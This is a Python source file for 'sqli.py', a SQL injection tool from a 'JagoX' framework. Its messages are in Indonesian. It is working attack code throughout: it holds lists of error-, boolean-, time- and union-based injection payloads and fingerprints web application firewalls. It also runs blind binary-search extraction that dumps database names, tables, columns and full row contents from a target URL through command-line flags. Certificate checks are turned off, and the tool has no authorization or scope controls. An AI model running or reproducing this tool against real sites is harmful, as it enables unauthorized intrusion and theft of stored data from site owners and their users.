#!/usr/bin/env python3
# sqli.py v1.0.0 — SQL injection + blind + dump
# Part of JagoX framework — MIT License
# [Part 1 of 3]

import re
import ssl
import time
import urllib.request
import urllib.parse
import urllib.error

__version__ = "1.0.0"

ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_",
        r"valid MySQL result", r"MySqlClient\.",
        r"com\.mysql\.jdbc\.exceptions",
        r"check the manual that (corresponds to|fits) your MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*Wpg_",
        r"valid PostgreSQL result", r"Npgsql\.",
        r"pg_query\(\)", r"PG::SyntaxError",
        r"unterminated quoted string at or near",
    ],
    "MSSQL": [
        r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
        r"System\.Data\.SqlClient\.SqlException",
        r"Unclosed quotation mark after the character string",
    ],
    "Oracle": [
        r"\bORA-[0-9]{5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*oci_", r"Warning.*ora_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException", r"\[SQLITE_ERROR\]",
        r"sqlite_", r"SQL logic error",
    ],
    "MongoDB": [
        r"MongoDB.*error", r"MongoError", r"E11000 duplicate key error",
    ],
    "Generic": [
        r"SQL syntax.*error", r"syntax error.*SQL",
        r"You have an error in your SQL syntax", r"Unclosed quotation mark",
        r"SQLSTATE\[", r"division by zero", r"Unknown column",
        r"Table '.*' doesn't exist", r"Unknown database",
    ],
}

_ERROR_REGEXES = []
for _dbms, _patterns in ERROR_PATTERNS.items():
    for _pat in _patterns:
        _ERROR_REGEXES.append((_dbms, re.compile(_pat, re.IGNORECASE)))

ERROR_PAYLOADS = ["'", "\"", "')", "\")", "';", "'-- -", "'#", "\\",
                   "%27", "%22", "1'", "1\"", "1')"]

BOOLEAN_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("\" AND 1=1-- -", "\" AND 1=2-- -"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("' OR '1'='1'-- -", "' OR '1'='2'-- -"),
]

TIME_PAYLOADS = {
    "MySQL": ["' AND SLEEP({delay})-- -", "\" AND SLEEP({delay})-- -",
              "1' AND SLEEP({delay})#", "1 AND SLEEP({delay})"],
    "PostgreSQL": ["'; SELECT pg_sleep({delay})-- -",
                   "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -"],
    "MSSQL": ["'; WAITFOR DELAY '0:0:{delay}'-- -",
              "1; WAITFOR DELAY '0:0:{delay}'-- -"],
    "Oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{delay})-- -"],
}

UNION_TEMPLATES = [
    "' UNION SELECT {cols}-- -",
    "\" UNION SELECT {cols}-- -",
]

WAF_SIGNATURES = [
    (r"cloudflare", "Cloudflare"), (r"akamai", "Akamai"),
    (r"mod_security|modsecurity", "ModSecurity"),
    (r"awselb|aws.*waf", "AWS WAF"),
    (r"imperva|incapsula", "Imperva"),
    (r"f5.*big.?ip|bigip", "F5 BIG-IP ASM"),
    (r"barracuda", "Barracuda"), (r"sucuri", "Sucuri"),
    (r"fortiweb|fortinet", "Fortinet FortiWeb"),
]

BLIND_SYNTAX = {
    "MySQL": {
        "length": "LENGTH(({query}))",
        "substr": "ASCII(SUBSTRING(({query}),{pos},1))",
        "comment": "-- -",
    },
    "PostgreSQL": {
        "length": "LENGTH(({query}))",
        "substr": "ASCII(SUBSTRING(({query}),{pos},1))",
        "comment": "-- -",
    },
    "MSSQL": {
        "length": "LEN(({query}))",
        "substr": "ASCII(SUBSTRING(({query}),{pos},1))",
        "comment": "-- -",
    },
}

BOOLEAN_DIFF_THRESHOLD = 80
BOOLEAN_BASELINE_THRESHOLD = 80
TIME_DELAY_MARGIN = 0.75
BLIND_LENGTH_RANGE = (0, 128)
BLIND_CHAR_RANGE = (32, 126)


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=5, delay_ms=0, extra_headers=None):
    if delay_ms:
        time.sleep(delay_ms / 1000.0)
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; nmpX/1.0)",
        "Accept": "*/*",
    }
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(url, headers=headers)
    start = time.time()
    result = {"status": 0, "headers": {}, "body": "",
              "error": None, "elapsed": 0.0}
    try:
        with urllib.request.urlopen(req, timeout=timeout,
                                     context=_make_ctx()) as resp:
            result["status"] = resp.status
            result["headers"] = dict(resp.headers)
            result["body"] = resp.read(65536).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        try:
            result["headers"] = dict(e.headers)
            result["body"] = e.read(65536).decode("utf-8", errors="replace")
        except Exception:
            pass
    except urllib.error.URLError as e:
        result["error"] = f"URLError: {e.reason}"
    except ssl.SSLError as e:
        result["error"] = f"SSLError: {e}"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    finally:
        result["elapsed"] = time.time() - start
    return result


def _replace_param(url, param, new_value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [new_value]
    return parsed._replace(
        query=urllib.parse.urlencode(qs, doseq=True)).geturl()


def detect_waf(resp):
    hdrs = " ".join(f"{k}:{v}" for k, v in resp["headers"].items()).lower()
    body_lower = resp["body"][:2000].lower()
    for pattern, name in WAF_SIGNATURES:
        if re.search(pattern, hdrs) or re.search(pattern, body_lower):
            return name
    return None


def _match_error(body):
    for dbms, regex in _ERROR_REGEXES:
        m = regex.search(body)
        if m:
            return dbms, m.group(0)[:150]
    return None, None


def _detect_error_based(url, param, base_resp, timeout, delay_ms):
    findings = []
    base_error_dbms, _ = _match_error(base_resp["body"])
    for payload in ERROR_PAYLOADS:
        test_url = _replace_param(url, param, payload)
        resp = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
        if resp["error"]:
            continue
        dbms, evidence = _match_error(resp["body"])
        if dbms and (base_error_dbms is None or dbms != base_error_dbms
                     or evidence not in base_resp["body"]):
            findings.append({
                "url": test_url, "param": param, "payload": payload,
                "evidence": f"{dbms}: {evidence}",
                "type": "error_based", "dbms": dbms, "severity": "CRITICAL",
            })
            return findings
    return findings


def _detect_boolean_based(url, param, base_resp, timeout, delay_ms):
    findings = []
    baseline_len = len(base_resp["body"])
    for true_payload, false_payload in BOOLEAN_PAIRS:
        true_url = _replace_param(url, param, true_payload)
        false_url = _replace_param(url, param, false_payload)
        true_resp = _fetch(true_url, timeout=timeout, delay_ms=delay_ms)
        false_resp = _fetch(false_url, timeout=timeout, delay_ms=delay_ms)
        if true_resp["error"] or false_resp["error"]:
            continue
        true_len = len(true_resp["body"])
        false_len = len(false_resp["body"])
        diff_tf = abs(true_len - false_len)
        diff_true_base = abs(true_len - baseline_len)
        diff_false_base = abs(false_len - baseline_len)
        if (diff_tf > BOOLEAN_DIFF_THRESHOLD
                and diff_true_base < BOOLEAN_BASELINE_THRESHOLD
                and diff_false_base > BOOLEAN_DIFF_THRESHOLD):
            findings.append({
                "url": true_url, "param": param, "payload": true_payload,
                "evidence": f"TRUE len={true_len} vs FALSE len={false_len}",
                "type": "boolean_based", "dbms": "unknown", "severity": "HIGH",
            })
            return findings
    return findings


def _detect_time_based(url, param, base_resp, timeout, delay_ms,
                        time_delay, dbms_hint=None):
    findings = []
    if dbms_hint and dbms_hint in TIME_PAYLOADS:
        payloads = [(dbms_hint, p) for p in TIME_PAYLOADS[dbms_hint]]
    else:
        payloads = []
        for db in ["MySQL", "PostgreSQL", "MSSQL", "Oracle"]:
            payloads.extend([(db, p) for p in TIME_PAYLOADS[db]])
    t1 = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if t1["error"]:
        return findings
    baseline_time = max(t1["elapsed"], 0.1)
    per_dbms_count = {}
    for dbms, tmpl in payloads:
        per_dbms_count[dbms] = per_dbms_count.get(dbms, 0) + 1
        if per_dbms_count[dbms] > 2:
            continue
        payload = tmpl.format(delay=int(time_delay))
        test_url = _replace_param(url, param, payload)
        test_timeout = max(timeout, time_delay + 5)
        resp = _fetch(test_url, timeout=test_timeout, delay_ms=0)
        if resp["error"]:
            continue
        elapsed = resp["elapsed"]
        expected = time_delay * TIME_DELAY_MARGIN
        if elapsed >= expected and elapsed < (time_delay + 8):
            findings.append({
                "url": test_url, "param": param, "payload": payload,
                "evidence": (f"elapsed={elapsed:.2f}s vs "
                             f"baseline={baseline_time:.2f}s"),
                "type": "time_based", "dbms": dbms, "severity": "HIGH",
            })
            return findings
    return findings


def _detect_union_based(url, param, base_resp, timeout, delay_ms):
    findings = []
    baseline_len = len(base_resp["body"])
    for cols_count in range(1, 6):
        cols = ",".join(["NULL"] * cols_count)
        for template in UNION_TEMPLATES:
            payload = template.format(cols=cols)
            test_url = _replace_param(url, param, payload)
            resp = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
            if resp["error"]:
                continue
            err_dbms, _ = _match_error(resp["body"])
            if err_dbms:
                continue
            new_len = len(resp["body"])
            if abs(new_len - baseline_len) > 300:
                findings.append({
                    "url": test_url, "param": param, "payload": payload,
                    "evidence": (f"UNION {cols_count} kolom: "
                                 f"len={new_len} vs baseline={baseline_len}"),
                    "type": "union_based", "dbms": "unknown",
                    "severity": "HIGH",
                })
                return findings
    return findings


def _test_condition(url, param, condition_payload, timeout, delay_ms,
                     base_len, tolerance=40):
    test_url = _replace_param(url, param, condition_payload)
    resp = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
    if resp["error"]:
        return None
    new_len = len(resp["body"])
    return abs(new_len - base_len) < tolerance


def _extract_length(url, param, query, timeout, delay_ms, base_len, dbms):
    syntax = BLIND_SYNTAX.get(dbms, BLIND_SYNTAX["MySQL"])
    length_expr = syntax["length"].format(query=query)
    comment = syntax["comment"]
    lo, hi = BLIND_LENGTH_RANGE
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"' AND {length_expr}>{mid}{comment}"
        result = _test_condition(url, param, payload, timeout, delay_ms,
                                   base_len)
        if result is None:
            return None
        if result:
            lo = mid + 1
        else:
            hi = mid
    return lo


def _extract_char(url, param, query, position, timeout, delay_ms,
                    base_len, dbms):
    syntax = BLIND_SYNTAX.get(dbms, BLIND_SYNTAX["MySQL"])
    substr_expr = syntax["substr"].format(query=query, pos=position)
    comment = syntax["comment"]
    lo, hi = BLIND_CHAR_RANGE
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"' AND {substr_expr}>{mid}{comment}"
        result = _test_condition(url, param, payload, timeout, delay_ms,
                                   base_len)
        if result is None:
            return None
        if result:
            lo = mid + 1
        else:
            hi = mid
    if 32 <= lo <= 126:
        return chr(lo)
    return None


def blind_extract(url, param, query, timeout=5, delay_ms=0,
                    dbms="MySQL", max_length=64):
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return None
    base_resp = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if base_resp["error"]:
        return None
    base_len = len(base_resp["body"])
    length = _extract_length(url, param, query, timeout, delay_ms,
                               base_len, dbms)
    if length is None or length <= 0 or length > max_length:
        return None
    result = ""
    for pos in range(1, length + 1):
        ch = _extract_char(url, param, query, pos, timeout, delay_ms,
                            base_len, dbms)
        if ch is None:
            return None
        result += ch
    return result


def blind_dump(url, param, timeout=5, delay_ms=0, dbms="MySQL",
                queries=None):
    if queries is None:
        queries = {"database()": "database()", "user()": "user()",
                   "version()": "version()"}
    results = {}
    for label, q in queries.items():
        try:
            val = blind_extract(url, param, q, timeout=timeout,
                                 delay_ms=delay_ms, dbms=dbms,
                                 max_length=128)
            results[label] = val
        except Exception:
            results[label] = None
    return results


def _extract_number(url, param, query, timeout, delay_ms, base_len, dbms):
    syntax = BLIND_SYNTAX.get(dbms, BLIND_SYNTAX["MySQL"])
    comment = syntax["comment"]
    lo, hi = 0, 10000
    while lo < hi:
        mid = (lo + hi) // 2
        payload = f"' AND ({query})>{mid}{comment}"
        result = _test_condition(url, param, payload, timeout, delay_ms,
                                   base_len)
        if result is None:
            return None
        if result:
            lo = mid + 1
        else:
            hi = mid
    return lo


def _extract_list(url, param, query_template, count_query, timeout,
                    delay_ms, dbms="MySQL", max_items=20):
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return []
    base_resp = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if base_resp["error"]:
        return []
    base_len = len(base_resp["body"])
    count = _extract_number(url, param, count_query, timeout, delay_ms,
                              base_len, dbms)
    if count is None:
        return []
    count = min(count, max_items)
    results = []
    for i in range(count):
        q = query_template.format(i=i)
        val = blind_extract(url, param, q, timeout=timeout,
                              delay_ms=delay_ms, dbms=dbms, max_length=64)
        if val:
            results.append(val)
        else:
            break
    return results


def dump_databases(url, param, timeout=5, delay_ms=0, dbms="MySQL",
                    max_items=20):
    return _extract_list(
        url, param,
        "SELECT schema_name FROM information_schema.schemata LIMIT {i},1",
        "SELECT COUNT(*) FROM information_schema.schemata",
        timeout, delay_ms, dbms, max_items)


def dump_tables(url, param, database, timeout=5, delay_ms=0,
                 dbms="MySQL", max_items=30):
    return _extract_list(
        url, param,
        f"SELECT table_name FROM information_schema.tables "
        f"WHERE table_schema='{database}' LIMIT {{i}},1",
        f"SELECT COUNT(*) FROM information_schema.tables "
        f"WHERE table_schema='{database}'",
        timeout, delay_ms, dbms, max_items)


def dump_columns(url, param, database, table, timeout=5, delay_ms=0,
                  dbms="MySQL", max_items=30):
    return _extract_list(
        url, param,
        f"SELECT column_name FROM information_schema.columns "
        f"WHERE table_schema='{database}' AND table_name='{table}' "
        f"LIMIT {{i}},1",
        f"SELECT COUNT(*) FROM information_schema.columns "
        f"WHERE table_schema='{database}' AND table_name='{table}'",
        timeout, delay_ms, dbms, max_items)


def dump_rows(url, param, database, table, columns, timeout=5,
               delay_ms=0, dbms="MySQL", limit=10, max_char=50):
    if not columns:
        return []
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return []
    base_resp = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if base_resp["error"]:
        return []
    base_len = len(base_resp["body"])
    sep = "||"
    col_concat = f"CONCAT_WS('{sep}',{','.join(columns)})"
    rows = []
    for i in range(limit):
        q = f"SELECT {col_concat} FROM {database}.{table} LIMIT {i},1"
        row_str = blind_extract(url, param, q, timeout=timeout,
                                  delay_ms=delay_ms, dbms=dbms,
                                  max_length=max_char * len(columns))
        if not row_str:
            break
        parts = row_str.split(sep)
        row = {}
        for idx, col in enumerate(columns):
            row[col] = parts[idx] if idx < len(parts) else ""
        rows.append(row)
    return rows


def scan(url, timeout=5, delay_ms=0, modes=None, time_delay=2.0,
         blind_dump_data=False):
    if modes is None:
        modes = ["error", "boolean", "time"]
    elif isinstance(modes, str):
        modes = [m.strip().lower() for m in modes.split(",")]
    else:
        modes = [m.strip().lower() for m in modes]

    findings = []
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return findings
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return findings

    base_resp = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if base_resp["error"]:
        return findings

    waf = detect_waf(base_resp)
    if waf:
        findings.append({
            "url": url, "param": "-", "payload": "-",
            "evidence": f"WAF terdeteksi: {waf}",
            "type": "waf_detected", "dbms": "unknown", "severity": "INFO",
        })

    confirmed_param = None
    confirmed_dbms = None

    for param in list(qs.keys())[:3]:
        if "error" in modes:
            f = _detect_error_based(url, param, base_resp, timeout, delay_ms)
            if f:
                findings.extend(f)
                confirmed_param = param
                confirmed_dbms = f[0].get("dbms", "MySQL")
                continue

        if "boolean" in modes:
            f = _detect_boolean_based(url, param, base_resp, timeout,
                                        delay_ms)
            if f:
                findings.extend(f)
                if not confirmed_param:
                    confirmed_param = param

        if "time" in modes:
            dbms_hint = None
            for existing in findings:
                if existing.get("dbms") and existing["dbms"] != "unknown":
                    dbms_hint = existing["dbms"]
                    break
            f = _detect_time_based(url, param, base_resp, timeout,
                                     delay_ms, time_delay, dbms_hint)
            if f:
                findings.extend(f)
                if not confirmed_param:
                    confirmed_param = param
                if not confirmed_dbms and f[0].get("dbms"):
                    confirmed_dbms = f[0].get("dbms")

        if "union" in modes:
            f = _detect_union_based(url, param, base_resp, timeout,
                                     delay_ms)
            if f:
                findings.extend(f)
                if not confirmed_param:
                    confirmed_param = param

    if "blind" in modes and confirmed_param and blind_dump_data:
        dbms = confirmed_dbms if confirmed_dbms in BLIND_SYNTAX else "MySQL"
        try:
            extracted = blind_dump(url, confirmed_param, timeout=timeout,
                                     delay_ms=delay_ms, dbms=dbms)
            evidence_parts = []
            for label, val in extracted.items():
                if val:
                    evidence_parts.append(f"{label}={val}")
            if evidence_parts:
                findings.append({
                    "url": url, "param": confirmed_param,
                    "payload": "binary_search",
                    "evidence": " | ".join(evidence_parts),
                    "type": "blind_extracted", "dbms": dbms,
                    "severity": "CRITICAL",
                })
        except Exception as e:
            findings.append({
                "url": url, "param": confirmed_param,
                "payload": "binary_search",
                "evidence": f"Blind extraction error: {e}",
                "type": "blind_error", "dbms": dbms, "severity": "INFO",
            })

    return findings


def _cli():
    import argparse
    import sys
    import os

    try:
        from . import banner as _bn
    except ImportError:
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            import banner as _bn
        except ImportError:
            _bn = None
    if _bn is not None:
        try:
            from rich.console import Console
            _bn.print_banner(console=Console(), version=__version__,
                              subtitle="SQL Injection + Blind + Dump")
        except ImportError:
            _bn.print_banner()

    parser = argparse.ArgumentParser(description="JagoX sqli v1.0.0")
    parser.add_argument("url")
    parser.add_argument("-t", "--timeout", type=float, default=5.0)
    parser.add_argument("-d", "--delay", type=int, default=0)
    parser.add_argument("-m", "--modes", default="error,boolean,time")
    parser.add_argument("--time-delay", type=float, default=2.0)
    parser.add_argument("--blind", action="store_true")
    parser.add_argument("--dump-db", action="store_true")
    parser.add_argument("--dump-tables", metavar="DB")
    parser.add_argument("--dump-columns", nargs=2, metavar=("DB", "TABLE"))
    parser.add_argument("--dump-rows", nargs=2, metavar=("DB", "TABLE"))
    parser.add_argument("--limit", type=int, default=10)
    parser.add_argument("--param")
    parser.add_argument("--version", action="version",
                        version=f"JagoX sqli v{__version__}")
    args = parser.parse_args()

    parsed = urllib.parse.urlparse(args.url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    param = args.param or (list(qs.keys())[0] if qs else None)
    if not param:
        print("[!] URL tidak punya query param.")
        return

    print(f"=== SQLi v1.0.0 — {args.url} ===")
    print(f"=== Param: '{param}' ===\n")

    if args.dump_db:
        dbs = dump_databases(args.url, param, timeout=args.timeout,
                              delay_ms=args.delay)
        print(f"\nDatabase ({len(dbs)}):")
        for d in dbs:
            print(f"  • {d}")
        return

    if args.dump_tables:
        tables = dump_tables(args.url, param, args.dump_tables,
                              timeout=args.timeout, delay_ms=args.delay)
        print(f"\nTables ({len(tables)}):")
        for t in tables:
            print(f"  • {t}")
        return

    if args.dump_columns:
        db, tbl = args.dump_columns
        cols = dump_columns(args.url, param, db, tbl, timeout=args.timeout,
                             delay_ms=args.delay)
        print(f"\nColumns ({len(cols)}):")
        for c in cols:
            print(f"  • {c}")
        return

    if args.dump_rows:
        db, tbl = args.dump_rows
        cols = dump_columns(args.url, param, db, tbl, timeout=args.timeout,
                             delay_ms=args.delay)
        if not cols:
            print("[!] Tidak bisa ambil columns.")
            return
        rows = dump_rows(args.url, param, db, tbl, cols,
                          timeout=args.timeout, delay_ms=args.delay,
                          limit=args.limit)
        print(f"\nRows ({len(rows)}):")
        for i, r in enumerate(rows, 1):
            print(f"  [{i}] " + " | ".join(f"{k}={v}" for k, v in r.items()))
        return

    modes = [m.strip() for m in args.modes.split(",")]
    if args.blind:
        modes.append("blind")

    findings = scan(args.url, timeout=args.timeout, delay_ms=args.delay,
                     modes=modes, time_delay=args.time_delay,
                     blind_dump_data=args.blind)

    if not findings:
        print("[OK] Tidak ada SQL injection terdeteksi.")
        return
    print(f"Total temuan: {len(findings)}\n")
    for f in findings:
        print(f"[{f['severity']:<8}] {f['type']:<18} param='{f['param']}'")
        print(f"            payload : {f['payload'][:60]}")
        print(f"            evidence: {f['evidence'][:120]}")
        print()


if __name__ == "__main__":
    _cli()
